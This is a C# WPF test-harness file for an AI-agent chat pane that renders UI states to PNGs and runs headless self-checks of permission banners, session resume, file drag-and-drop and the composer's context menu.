                // Captured EXPANDED, because collapsed is the state the tree shares with no tree at
                // all: a shot of closed rows cannot show whether a chevron reveals anything, which is
                // the whole of what was added. One server open and one shut also puts both chevron
                // orientations in the same frame, so a rotation stuck at one angle is visible.
                foreach (var row in vm.McpRows)
                {
                    if (row.IsExpandable && row.Key is not null && !row.IsExpanded)
                    {
                        vm.ToggleMcpRow(row);
                        break;
                    }
                }

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                if (FindDescendantByName(window, "McpPopup") is System.Windows.Controls.Primitives.Popup mcpPopup
                    && mcpPopup.Child is System.Windows.FrameworkElement mcpPanel)
                {
                    mcpPanel.UpdateLayout();
                    CaptureElementToPng(mcpPanel, Path.Combine(workDir, "screenshot-mcp.png"));
                }
                vm.IsMcpOpen = false;
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// The first element in the tree whose DataContext is a <typeparamref name="T"/> — how the smoke
        /// reaches a row rendered by an ItemsControl DataTemplate (its x:Name lives in the template's own
        /// name scope, so <see cref="FindDescendantByName"/> can't see it).
        /// </summary>
        private static System.Windows.FrameworkElement? FindDescendantByDataContext<T>(System.Windows.DependencyObject root)
        {
            for (var i = 0; i < System.Windows.Media.VisualTreeHelper.GetChildrenCount(root); i++)
            {
                var child = System.Windows.Media.VisualTreeHelper.GetChild(root, i);
                if (child is System.Windows.FrameworkElement fe && fe.DataContext is T && fe.ContextMenu is not null)
                    return fe;
                if (FindDescendantByDataContext<T>(child) is { } nested)
                    return nested;
            }
            return null;
        }

        /// <summary>
        /// First descendant of a type, optionally matching a predicate. The predicate matters for the
        /// message template: every transcript row carries a markdown viewer, collapsed and empty unless
        /// the row is an assistant message, so a plain type search hands back a user row's empty one.
        /// </summary>
        /// <summary>
        /// Whether this process owns the foreground window right now.
        /// </summary>
        /// <remarks>
        /// <b>Stamped onto every focus assertion, because a focus check silently assumes something the
        /// harness cannot control.</b> Keyboard focus goes null when a window loses activation, so a
        /// developer typing somewhere else while the self-check runs makes a perfectly good check report
        /// a perfectly good build as broken — observed once as
        /// <c>bannerFocused=True, bannerLanded=&lt;null&gt;</c>, with the neighbouring focus assertions in
        /// the same run passing, which is the shape of a transient activation loss rather than a defect.
        /// <para>
        /// This is the same rule the IDE tools follow: where a check genuinely cannot tell "the feature
        /// is broken" from "I could not look", it must say so rather than assert one of them. It is
        /// deliberately a STAMP and not a skip — a check that quietly opts out when unfocused would take
        /// a diagnosable false failure and trade it for an undiagnosable silent gap on a release gate.
        /// The run still fails; the reader just learns the cause in one glance instead of an hour.
        /// </para>
        /// <para>Best-effort: any failure reads as "cannot tell", never as "not focused".</para>
        /// </remarks>
        private static string ForegroundStamp()
        {
            try
            {
                var fg = NativeMethods.GetForegroundWindow();
                if (fg == IntPtr.Zero)
                    return "none";

                _ = NativeMethods.GetWindowThreadProcessId(fg, out var pid);
                return pid == (uint)System.Diagnostics.Process.GetCurrentProcess().Id ? "ours" : "elsewhere";
            }
            catch
            {
                return "unknown";
            }
        }

        private static class NativeMethods
        {
            [System.Runtime.InteropServices.DllImport("user32.dll")]
            internal static extern IntPtr GetForegroundWindow();

            [System.Runtime.InteropServices.DllImport("user32.dll")]
            internal static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        }

        private static T? FindDescendantOfType<T>(System.Windows.DependencyObject root, Func<T, bool>? where = null)
            where T : System.Windows.DependencyObject
        {
            for (var i = 0; i < System.Windows.Media.VisualTreeHelper.GetChildrenCount(root); i++)
            {
                var child = System.Windows.Media.VisualTreeHelper.GetChild(root, i);
                if (child is T match && (where is null || where(match)))
                    return match;
                if (FindDescendantOfType(child, where) is { } nested)
                    return nested;
            }
            return null;
        }

        /// <summary>
        /// How many matching descendants a subtree actually realised. Counting rather than finding,
        /// because "some child row rendered" and "every child row rendered" are different claims and
        /// only the second one says the nesting works (issue #125).
        /// </summary>
        private static int CountDescendants<T>(System.Windows.DependencyObject root, Func<T, bool> where)
            where T : System.Windows.DependencyObject
        {
            var count = 0;
            for (var i = 0; i < System.Windows.Media.VisualTreeHelper.GetChildrenCount(root); i++)
            {
                var child = System.Windows.Media.VisualTreeHelper.GetChild(root, i);
                if (child is T match && where(match))
                    count++;
                count += CountDescendants(child, where);
            }
            return count;
        }

        /// <summary>
        /// Every hyperlink in a rendered document, at any nesting depth.
        ///
        /// <para>Every container markdown can produce has to be here, or the helper's answer for a
        /// document it cannot walk into is ZERO — which every caller reads as "the link was never
        /// made". It handled paragraphs and spans only, so a reference inside a bullet — the
        /// commonest shape in agent prose — was invisible to it (#247). Lists and tables reach their
        /// inlines through blocks of their own, and a Figure/Floater is an INLINE holding blocks.</para>
        /// </summary>
        private static List<System.Windows.Documents.Hyperlink> Hyperlinks(System.Windows.Documents.FlowDocument document)
        {
            var found = new List<System.Windows.Documents.Hyperlink>();
            Collect(document.Blocks);
            return found;

            void Collect(System.Collections.IEnumerable elements)
            {
                foreach (var element in elements)
                {
                    switch (element)
                    {
                        // Hyperlink is itself a Span, so it must be matched before one.
                        case System.Windows.Documents.Hyperlink link:
                            found.Add(link);
                            break;
                        case System.Windows.Documents.Span span:
                            Collect(span.Inlines);
                            break;
                        case System.Windows.Documents.AnchoredBlock anchored:
                            Collect(anchored.Blocks);
                            break;
                        case System.Windows.Documents.Paragraph paragraph:
                            Collect(paragraph.Inlines);
                            break;
                        case System.Windows.Documents.Section section:
                            Collect(section.Blocks);
                            break;
                        case System.Windows.Documents.List list:
                            Collect(list.ListItems);
                            break;
                        case System.Windows.Documents.ListItem item:
                            Collect(item.Blocks);
                            break;
                        case System.Windows.Documents.Table table:
                            Collect(table.RowGroups);
                            break;
                        case System.Windows.Documents.TableRowGroup rowGroup:
                            Collect(rowGroup.Rows);
                            break;
                        case System.Windows.Documents.TableRow row:
                            Collect(row.Cells);
                            break;
                        case System.Windows.Documents.TableCell cell:
                            Collect(cell.Blocks);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// One hyperlink's own text.
        ///
        /// <para>Read from its runs, NOT through a <c>TextRange</c> over its content positions. A
        /// TextRange serialises the STRUCTURE the range sits in as well as the characters: a link at
        /// the start of a paragraph inside a ListItem comes back with the list marker's tab in front
        /// of it, so the same link reads "Data/x.cs:12" in prose and a tab-prefixed version of itself
        /// in a bullet (#247). The runs are the content and nothing else.</para>
        /// </summary>
        private static string LinkText(System.Windows.Documents.Hyperlink link)
        {
            var text = new StringBuilder();
            Collect(link.Inlines);
            return text.ToString();

            void Collect(System.Windows.Documents.InlineCollection inlines)
            {
                foreach (var inline in inlines)
                {
                    if (inline is System.Windows.Documents.Run run)
                        text.Append(run.Text);
                    else if (inline is System.Windows.Documents.Span span)
                        Collect(span.Inlines);
                }
            }
        }

        private static System.Windows.FrameworkElement? FindDescendantByName(System.Windows.DependencyObject root, string name)
        {
            for (var i = 0; i < System.Windows.Media.VisualTreeHelper.GetChildrenCount(root); i++)
            {
                var child = System.Windows.Media.VisualTreeHelper.GetChild(root, i);
                if (child is System.Windows.FrameworkElement fe && fe.Name == name)
                    return fe;
                if (FindDescendantByName(child, name) is { } nested)
                    return nested;
            }
            return null;
        }

        /// <summary>
        /// Fires a Kiro-style edit permission request (the messy rawInput shape from the field report)
        /// and renders the banner to a PNG, so the improved edit prompt — the agent's intent shown
        /// cleanly instead of the raw JSON dump — can be eyeballed offline. (The "View diff" button is
        /// VSIX-only: it needs a correlated transcript row + a real diff viewer, absent in this harness.)
        /// </summary>
        private async Task RunEditPermissionScreenshotAsync(ChatViewModel vm, Window window, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-edit.png");
            try
            {
                await vm.InitializeAsync().ConfigureAwait(true);

                const string editPath = @"C:\src\BlazorApp1\BlazorApp1.Tests\ATestClassTests.cs";
                // The raw rawInput a Kiro strReplace edit carries — the JSON the banner used to dump verbatim.
                var detail = System.Text.Json.JsonSerializer.Serialize(new
                {
                    __tool_use_purpose = "Fix both failing test assertions",
                    command = "strReplace",
                    path = editPath,
                    oldStr = "        Assert.NotNull(instance.ATestProperty);",
                    newStr = "        Assert.Null(instance.ATestProperty);",
                });

                _ = vm.RequestPermissionAsync(new PermissionRequestDto(
                    "edit-shot", "Editing ATestClassTests.cs", "edit", detail, null,
                    new[]
                    {
                        new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                        new PermissionOptionDto("allow_always", "Allow always", "AllowAlways"),
                        new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
                    },
                    Path: editPath));

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                // Enter the scoped "always" step so the This file / This folder chips + glob editor show.
                vm.PendingPermission?.Options
                    .FirstOrDefault(o => string.Equals(o.Kind, "AllowAlways", StringComparison.OrdinalIgnoreCase))
                    ?.Command.Execute(null);
                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-edit-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        private static void CaptureToPng(Window window, string path) =>
            CaptureVisualToPng(window, (int)System.Math.Ceiling(window.ActualWidth),
                (int)System.Math.Ceiling(window.ActualHeight), path);

        /// <summary>
        /// Renders an element that sits low in the window. <see cref="CaptureVisualToPng"/> draws a visual
        /// at its layout offset, so an element at y=600 lands outside a bitmap only as tall as itself and
        /// the file comes out blank. Painting it through a <see cref="VisualBrush"/> re-origins it at
        /// (0,0), which is offset-independent.
        /// </summary>
        private static void CaptureElementToPng(System.Windows.FrameworkElement element, string path)
        {
            var width = (int)System.Math.Ceiling(element.ActualWidth);
            var height = (int)System.Math.Ceiling(element.ActualHeight);
            if (width <= 0 || height <= 0)
                return;

            var visual = new System.Windows.Media.DrawingVisual();
            using (var ctx = visual.RenderOpen())
            {
                ctx.DrawRectangle(
                    new System.Windows.Media.VisualBrush(element) { Stretch = System.Windows.Media.Stretch.None },
                    null,
                    new Rect(0, 0, width, height));
            }

            var rtb = new System.Windows.Media.Imaging.RenderTargetBitmap(
                width, height, 96, 96, System.Windows.Media.PixelFormats.Pbgra32);
            rtb.Render(visual);

            var encoder = new System.Windows.Media.Imaging.PngBitmapEncoder();
            encoder.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(rtb));
            using var stream = File.Create(path);
            encoder.Save(stream);
        }

        private static void CaptureVisualToPng(System.Windows.Media.Visual visual, int width, int height, string path)
        {
            if (width <= 0 || height <= 0)
                return;
            var rtb = new System.Windows.Media.Imaging.RenderTargetBitmap(
                width, height, 96, 96, System.Windows.Media.PixelFormats.Pbgra32);
            rtb.Render(visual);

            var encoder = new System.Windows.Media.Imaging.PngBitmapEncoder();
            encoder.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(rtb));
            using var stream = File.Create(path);
            encoder.Save(stream);
        }

        /// <summary>
        /// Seeds a few sample conversations, opens the history picker, and renders the popup to a PNG.
        /// The popup renders in its own window, so the normal window-capture can't reach it — we render
        /// the popup's child visual directly. A dev aid for iterating on the picker UI headlessly.
        /// </summary>
        private async Task RunHistoryScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-history.png");
            try
            {
                SeedSampleSessions(store, workDir);
                vm.RefreshHistory();
                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                if (window.Content is FrameworkElement chat &&
                    chat.FindName("HistoryPopup") is System.Windows.Controls.Primitives.Popup popup)
                {
                    popup.IsOpen = true;
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                    if (popup.Child is FrameworkElement child)
                    {
                        child.UpdateLayout();
                        CaptureVisualToPng(child,
                            (int)System.Math.Ceiling(child.ActualWidth),
                            (int)System.Math.Ceiling(child.ActualHeight), path);
                    }
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-history-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// Seeds a large, resumable conversation, restores it, and renders the resume banners to PNGs.
        /// A dev aid for iterating on the resume UI headlessly.
        /// <para>Two shots, because the banner asks at more than one moment and they are not the same
        /// question: the send-time choice (full vs summary, with a way out), and the one the backend's
        /// refusal raises after the fresh session is already open (issue #268 — summary vs send
        /// anyway, with none). The second is the one that is awkward to reach by hand: exercising it in Visual Studio means
        /// making a conversation under one Kiro agent engine and reopening it under another.</para>
        /// </summary>
        private async Task RunResumeScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-resume.png");
            try
            {
                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "Refactor the auth module",
                    // A backend that isn't registered here, so restore can't re-select it and full reload
                    // can't apply — the banner offers summary only. (A matching, resumable provider that
                    // IS available shows both buttons.)
                    ProviderId = "claude-code",
                    ConversationId = "conv-123",
                };
                session.Log.Add(new TranscriptEntry { Role = "user", Text = "How does the auth module work?" });
                session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "text", Text = "It issues signed tokens and validates them per request. " + new string('.', 4200) } });
                session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "turnDone" } });
                store.Save(session);

                // Ensure the provider catalog is loaded (SupportsResume) before restoring.
                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();
                // The banner is decided at send-time now, so drive a send to surface it (this defers
                // behind the choice rather than sending).
                vm.InputText = "and continue from here";
                vm.SendCommand.Execute(null);
                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);

                await CaptureRefusedResumeAsync(vm, window, store, workDir).ConfigureAwait(true);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-resume-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// The banner a REFUSED reload raises (issue #268). Driven all the way through the engine
        /// rather than posed: the fake disclaims a conversation id spelled with its marker, exactly as
        /// kiro-cli v2 answers an id from the v3 store, so what this renders is the state a real
        /// refusal puts the pane in — a fresh session already open, the whole earlier conversation
        /// still on screen above the message, and the send parked on which context it goes out with.
        /// </summary>
        private static async Task CaptureRefusedResumeAsync(
            ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            // Back out of the first shot's parked send and clear the pane, so this one starts from the
            // state a reopen actually starts from rather than from the previous capture's leftovers.
            vm.PendingResume?.CancelCommand.Execute(null);
            vm.NewSessionCommand.Execute(null);

            var session = new PersistedSession
            {
                WorkspaceRootPath = workDir,
                Title = "Refactor the auth module",
                // The registered backend, so the full reload is genuinely attempted — and an id the
                // fake will disclaim, which is what makes the attempt fail the way the live one did.
                // Spelled out rather than shared: the Desktop references the engine as a BUILD
                // dependency only (ReferenceOutputAssembly=false), it being a process we spawn.
                // FakeSession.DisclaimedIdMarker is the other end.
                ProviderId = "fake",
                ConversationId = "conv-456-disclaimed",
            };
            session.Log.Add(new TranscriptEntry { Role = "user", Text = "How does the auth module work?" });
            session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "text", Text = "It issues signed tokens and validates them per request. " + new string('.', 4200) } });
            session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "turnDone" } });
            store.Save(session);

            vm.RestoreMostRecentSession();
            vm.InputText = "can you retry?";
            vm.SendCommand.Execute(null);
            // The send-time choice comes first; taking the full reload is what asks the backend for the
            // conversation it is about to disclaim.
            await WaitForTranscriptAsync(() => vm.PendingResume is not null, TimeSpan.FromSeconds(10))
                .ConfigureAwait(true);
            vm.PendingResume?.ResumeFullCommand.Execute(null);

            // A real session start over the engine wire, so poll for the banner rather than yielding
            // once — and poll for THIS banner: the one above is also non-null.
            await WaitForTranscriptAsync(
                () => vm.PendingResume?.AllowFresh == true, TimeSpan.FromSeconds(20)).ConfigureAwait(true);
            window.UpdateLayout();
            CaptureToPng(window, Path.Combine(workDir, "screenshot-resume-refused.png"));
        }

        // A handful of saved conversations (distinct timestamps) so the picker isn't empty.
        private static void SeedSampleSessions(FileSessionStore store, string workDir)
        {
            void Add(string title, string[] providerIds, params string[] userMessages)
            {
                var session = new PersistedSession { WorkspaceRootPath = workDir, Title = title };
                session.ProviderIds.AddRange(providerIds);
                session.ProviderId = providerIds.LastOrDefault();
                foreach (var message in userMessages)
                {
                    session.Log.Add(new TranscriptEntry { Role = "user", Text = message });
                    session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "text", Text = "Sure — done." } });
                }
                store.Save(session);
                System.Threading.Thread.Sleep(8); // keep UpdatedUtc ordering deterministic
            }

            Add("Refactor the auth module", new[] { "Claude Code" }, "How does auth work?", "Extract a service");
            // A conversation that started on one agent and was summary-resumed onto another.
            Add("Explain the build pipeline", new[] { "Kiro", "Claude Code" }, "What does CI do here?");
            Add("Fix the failing FooTest", new[] { "Kiro" }, "Why is FooTest red?");
        }

        /// <summary>
        /// Headless self-check: drive one prompt end to end and assert the transcript received
        /// assistant text and an edit routed through the host. Writes the result to a file and
        /// exits with code 0 (pass) / 1 (fail) so it can be verified offline like the Console proofs.
        /// </summary>
        // Drives two concurrent permission requests through the view-model's banner queue (issue #30).
        // Both must surface — the first shown as the head, the second held behind it — and both tasks
        // must resolve when answered. Under the old single-slot design the second request would clobber
        // the first's banner and its task would hang, so Task.WhenAll times out below and this fails.
        /// <summary>
        /// The pasted-image path through the real input stack (issue #118). What this reaches and the
        /// unit tests cannot is everything downstream of the seam: the chip's DataTemplate and the
        /// bubble's thumbnail template, where a mistyped <c>StaticResource</c> key is a runtime XAML
        /// failure that every headless view-model test passes straight over.
        /// <para>
        /// Data objects are supplied directly rather than going through
        /// <c>Clipboard.SetDataObject</c> + <c>Paste()</c>. A self-check must not clobber the
        /// developer's clipboard — the same rule as the config and attachment redirects, and the same
        /// failure it would produce: the harness quietly damaging the machine it verifies on.
        /// </para>
        /// <para>
        /// The limit is worth stating, because this check passed over a build that did not work: it
        /// cannot drive WPF's decision about <em>whether to raise a paste at all</em>, which is what
        /// broke. Asserting the command binding exists is the stand-in.
        /// </para>
        /// </summary>

        /// <summary>
        /// Drag-and-drop proof (#62): a file dropped anywhere in the chat puts its PATH into the
        /// composer, spelled against the agent's root, on the undo stack — and text dropped on the input
        /// box is still left to the TextBox.
        /// </summary>
        /// <remarks>
        /// <para>
        /// <b>The mechanism is asserted separately from the seam</b> — the #118 shape, a check on the seam
        /// passing while WPF never raises the event. A seam-only check cannot drive WPF's own decision about whether to raise the
        /// event at all: <see cref="DragEventArgs"/> has no public constructor, and
        /// <c>DragDrop.DoDragDrop</c> starts a real modal loop that a headless run cannot survive. So the
        /// registrations are inspected directly — <c>AllowDrop</c>, plus the two handlers, both of which
        /// are XAML attributes whose removal leaves an unused private method and a perfectly clean build.
        /// </para>
        /// <para>
        /// The handler probe first proves it can SEE a known-present handler (<c>PreviewKeyDown</c>, which
        /// the zoom shortcut has occupied since long before this feature). A reflection probe that has
        /// quietly stopped working otherwise reports "no handlers" and reads as a real failure — or worse,
        /// is believed when it says everything is fine.
        /// </para>
        /// </remarks>
        private static async Task<(bool ok, string detail)> VerifyFileDropAsync(
            ChatViewModel vm, Window window, string workDir)
        {
            if (FindDescendantOfType<CodeWicket.UI.Views.ChatView>(window) is not { } chatView)
                return (false, "no ChatView");
            if (FindDescendantByName(window, "InputBox") is not System.Windows.Controls.TextBox inputBox)
                return (false, "no InputBox");

            // --- mechanism ---------------------------------------------------------------------------
            var allowsDrop = chatView.AllowDrop;
            var probeSees = HasRoutedHandler(chatView, System.Windows.UIElement.PreviewKeyDownEvent);
            var handlesDragOver = HasRoutedHandler(chatView, System.Windows.DragDrop.PreviewDragOverEvent);
            var handlesDrop = HasRoutedHandler(chatView, System.Windows.DragDrop.PreviewDropEvent);

            // --- the payload spelling ----------------------------------------------------------------
            // Real files under the vm's own root, so the relative spelling is the one a user would see.
            var root = vm.AgentPathRootForDiagnostics;
            var dropDir = Path.Combine(root, "dropped");
            Directory.CreateDirectory(dropDir);
            var plain = Path.Combine(dropDir, "one.txt");
            var spaced = Path.Combine(dropDir, "two three.txt");
            // Genuinely outside: workDir IS the root here, so a file under it would be spelled
            // relative and the assertion would be testing nothing.
            var outside = Path.Combine(Path.GetTempPath(), "cwkt-drop-outside.txt");
            File.WriteAllText(plain, "one");
            File.WriteAllText(spaced, "two three");
            File.WriteAllText(outside, "outside");

            var log = new List<string>();
            CodeWicket.UI.Input.FileDropPaths.Log = line => log.Add(line);
            try
            {
                vm.InputText = string.Empty;

                // Two files, one of them needing quotes, in the order they were selected.
                var tookFiles = chatView.TryDropData(FileDrop(plain, spaced), null);
                var filesDetail = vm.InputText;
                var spelledRelative = filesDetail == "dropped/one.txt \"dropped/two three.txt\"";

                // A file outside the workspace stays absolute, so it stays obvious.
                vm.InputText = string.Empty;
                chatView.TryDropData(FileDrop(outside), null);
                var spelledAbsolute = vm.InputText == outside;

                // The VS project-item shape: a guid and a project name ahead of the one real path. Only
                // the path may survive — the rest would land in the user's prompt as though it were a file.
                vm.InputText = string.Empty;
                var blob = new DataObject();
                blob.SetData("CF_VSSTGPROJECTITEMS",
                    "{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}|MyProject.csproj|" + plain);
                chatView.TryDropData(blob, null);
                var blobDetail = vm.InputText;
                var blobKeptOnlyTheFile = blobDetail == "dropped/one.txt";

                // Undo. This is the only assertion that pins SelectedText as the mechanism: an
                // implementation appending to vm.InputText passes every other check here and leaves the
                // user with no way to take a mis-drop back.
                vm.InputText = "before ";
                await SettleAsync(window).ConfigureAwait(true);
                chatView.TryDropData(FileDrop(plain, spaced), null);
                var beforeUndo = vm.InputText;
                inputBox.Undo();
                var undone = vm.InputText == "before ";

                // The binding actually carries the insert to the view-model — the box and the model must
                // not be able to disagree about what is about to be sent.
                var boxAndModelAgree = vm.InputText == inputBox.Text;

                // Text over the input box is NOT ours: the TextBox keeps drag-to-move, and keeps routing
                // its drops through the paste pipeline, which is the only reason dragged terminal output
                // is cleaned today.
                vm.InputText = "typed";
                var text = new DataObject();
                text.SetData(DataFormats.UnicodeText, "dragged text");
                var refusedOverBox = !chatView.TryDropData(text, new Point(2, 2))
                    && vm.InputText == "typed";

                // A drop that decodes to nothing changes nothing. The handler still marks it handled —
                // that is what stops VS opening a tab — but the composer must be untouched.
                vm.InputText = "typed";
                var ghost = new DataObject();
                ghost.SetData(DataFormats.FileDrop, new[] { Path.Combine(root, "no-such-file.cs") });
                var ghostChangedNothing = !chatView.TryDropData(ghost, null) && vm.InputText == "typed";

                // And the diagnostic wrote a line even for that one, because "a format we do not read"
                // and "the drag never arrived" are the same absence otherwise.
                var loggedTheGhost = log.Any(l => l.Contains("kept=0", StringComparison.Ordinal));
                var loggedFormats = log.Any(l => l.Contains("formats=[", StringComparison.Ordinal));

                // --- the "Add - File path..." picker, which is this same insertion with no pointer ----
                // The dialog cannot be summoned from a check, so the seam beneath it is what runs. Two
                // things are asserted and the second is the whole design of the gesture:
                //
                //  * the SPELLING comes from the same canonicalizer, so the two routes cannot name one
                //    file two ways (edits dedupe on the path; a second spelling splits a file in half);
                //  * it APPENDS, and does not use the caret. A drop aims with the pointer; a menu click
                //    has nothing to aim with, so the caret is wherever it was last left - here parked at
                //    index 0, in the middle of a half-typed sentence, which is precisely the state that
                //    makes a caret-driven insert wrong.
                vm.InputText = "look at ";
                await SettleAsync(window).ConfigureAwait(true);
                inputBox.CaretIndex = 0;
                var picked = chatView.TryInsertFilePaths(new[] { plain });
                var pickedDetail = vm.InputText;
                var pickedAppended = picked && pickedDetail == "look at dropped/one.txt";

                // Multi-select, and it is ONE undo like a multi-file drop rather than one per path.
                vm.InputText = string.Empty;
                await SettleAsync(window).ConfigureAwait(true);
                chatView.TryInsertFilePaths(new[] { plain, spaced });
                var pickedManyDetail = vm.InputText;
                inputBox.Undo();
                var pickedManyUndone = vm.InputText.Length == 0
                    && pickedManyDetail == "dropped/one.txt \"dropped/two three.txt\"";

                vm.InputText = string.Empty;
                await SettleAsync(window).ConfigureAwait(true);

                var ok = allowsDrop && probeSees && handlesDragOver && handlesDrop
                         && tookFiles && spelledRelative && spelledAbsolute && blobKeptOnlyTheFile
                         && undone && boxAndModelAgree && refusedOverBox && ghostChangedNothing
                         && loggedTheGhost && loggedFormats
                         && pickedAppended && pickedManyUndone;

                return (ok,
                    $"allowDrop={allowsDrop} probeSees={probeSees} dragOver={handlesDragOver} " +
                    $"drop={handlesDrop} files=\"{filesDetail}\" absolute={spelledAbsolute} " +
                    $"blob=\"{blobDetail}\" undo={undone} (was \"{beforeUndo}\") agree={boxAndModelAgree} " +
                    $"refusedOverBox={refusedOverBox} ghostNoOp={ghostChangedNothing} " +
                    $"logged={loggedTheGhost}/{loggedFormats} " +
                    $"picked=\"{pickedDetail}\" (appended={pickedAppended}) " +
                    $"pickedMany={pickedManyUndone} (\"{pickedManyDetail}\") root={root}");
            }
            finally
            {
                CodeWicket.UI.Input.FileDropPaths.Log = null;
            }
        }

        private static DataObject FileDrop(params string[] paths)
        {
            var data = new DataObject();
            data.SetData(DataFormats.FileDrop, paths);
            return data;
        }

        /// <summary>
        /// Whether <paramref name="element"/> has a handler registered for <paramref name="routedEvent"/>.
        /// </summary>
        /// <remarks>
        /// Reaches <c>UIElement.EventHandlersStore</c>, which is not public — there is no supported way to
        /// ask. Worth it because a XAML-declared handler is not guaranteed by the compiler: delete the
        /// attribute and the private method simply becomes unused, the build stays clean, and every
        /// offline test still passes while the feature does nothing at all. Best-effort by nature, which
        /// is exactly why the caller proves the probe can see a known-present handler first.
        /// </remarks>
        private static bool HasRoutedHandler(System.Windows.UIElement element, RoutedEvent routedEvent)
        {
            try
            {
                var storeProperty = typeof(System.Windows.UIElement).GetProperty(
                    "EventHandlersStore",
                    System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                var store = storeProperty?.GetValue(element);
                if (store is null)
                    return false;

                var get = store.GetType().GetMethod("GetRoutedEventHandlers");
                // RoutedEventHandlerInfo[], NOT Delegate[] — matching the wrong element type is how
                // this probe first reported "blind" against a correctly wired control.
                return get?.Invoke(store, new object[] { routedEvent }) is Array { Length: > 0 };
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// The composer's "Add" menu (issue #73, rung 2): the button is wired, the menu is built from
        /// the registered sources, an unavailable one is offered and disabled, and taking one puts a
        /// chip in the composer.
        ///
        /// <para><b>Why the mechanism and not just the outcome.</b> The Click is a XAML attribute, so
        /// removing it leaves an unused private method and a clean build - every unit test still
        /// passes while the button does nothing at all. That is #62's lesson and #118's before it, so
        /// the check drives the handler through the routed event rather than calling the source's
        /// command directly, and the item COUNT is what goes to zero when the wiring is gone.</para>
        ///
        /// <para><b>Non-disruptive by construction.</b> The persistence round trip is a unit test; this
        /// adds a chip and removes it again, closes the menu it opened, and touches the transcript not
        /// at all - so it cannot poison a later phase the way the drill-down padding did.</para>
        /// </summary>
        private static async Task<(bool ok, string detail)> VerifyContextMenuAsync(ChatViewModel vm, Window window)
        {
            if (FindDescendantByName(window, "AddContextButton") is not System.Windows.Controls.Button button)
                return (false, "no AddContextButton - the composer strip is not drawn");
            if (button.ContextMenu is not { } menu)
                return (false, "the Add button carries no ContextMenu");

            var wired = HasRoutedHandler(button, System.Windows.Controls.Primitives.ButtonBase.ClickEvent);

            // Through the routed event, so what is under test is the handler XAML claims to have
            // registered rather than a method this check happens to know the name of.
            button.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ButtonBase.ClickEvent, button));
            await Task.Yield();

            var items = menu.Items.OfType<System.Windows.Controls.MenuItem>().ToList();

            // The registered sources, plus the one item that is not one of them: "Image..." attaches a
            // file and is offered by every host, so a menu carrying only the sources means the item was
            // dropped - which no unit test can see, the menu being built in code-behind. It is never
            // disabled, and it is NOT clicked here: that would summon a modal file dialog. The seam it
            // runs on is driven by the image-paste phase instead, which is the same rule the paste
            // itself follows about not touching the real clipboard.
            var imageItem = items.FirstOrDefault(
                i => (i.Tag as string) == CodeWicket.UI.Views.ChatView.AttachImageMenuItemTag);
            var offersImage = imageItem is { IsEnabled: true };

            // Its neighbour, which types a path into the box instead of attaching a chip. What it DOES is
            // asserted in the file-drop phase, where the root fixtures that make a spelling meaningful
            // already exist; here the question is only whether the handler built it at all.
            var filePathItem = items.FirstOrDefault(
                i => (i.Tag as string) == CodeWicket.UI.Views.ChatView.InsertFilePathMenuItemTag);
            var offersFilePath = filePathItem is { IsEnabled: true };

            var built = items.Count == vm.ContextSources.Count + 2 && items.Count >= 4;

            // The state a user meets FIRST is the disabled one - nothing is stopped when they go
            // looking - so a menu that only ever draws enabled items has not been seen working.
            var offersDisabled = items.Any(i => !i.IsEnabled);
            var offersEnabled = items.Any(i => i.IsEnabled);

            // ...and it has to be OUR menu. A popup is its own visual tree, so an unstyled ContextMenu
            // comes up in the platform's light chrome inside a dark pane - which is a defect no
            // content assertion notices and which shipped once, for every right-click menu in the
            // transcript. Compared against the RESOLVED resources rather than colour literals: the
            // VSIX remaps these keys onto live VS brushes, so a hard-coded expectation would pass
            // here and be wrong in the IDE.
            var themed = ReferenceEquals(menu.Background, menu.TryFindResource("Chat.InputBackground"))
                && ReferenceEquals(menu.BorderBrush, menu.TryFindResource("Chat.Border"))
                && items.All(i => ReferenceEquals(i.Foreground, i.TryFindResource("Chat.Foreground")));

            menu.IsOpen = false;

